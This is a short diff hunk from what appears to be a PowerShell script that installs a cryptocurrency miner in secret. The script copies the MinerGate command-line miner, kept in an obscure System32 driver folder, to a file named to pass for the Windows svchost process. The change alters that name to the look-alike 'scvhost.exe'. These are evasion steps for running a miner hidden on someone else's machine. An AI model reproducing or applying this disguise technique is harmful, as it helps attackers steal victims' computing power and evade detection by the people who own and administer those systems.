@@ -29,7 +29,7 @@ Remove-Item MG.zip
 
 
 # Create renamed copy of Miner
-Copy-Item C:\Windows\System32\drivers\en-US\etc\minergate-cli.exe C:\Windows\System32\drivers\en-US\etc\svchost.exe
+Copy-Item C:\Windows\System32\drivers\en-US\etc\minergate-cli.exe C:\Windows\System32\drivers\en-US\etc\scvhost.exe
 
 
 #Delete Miner
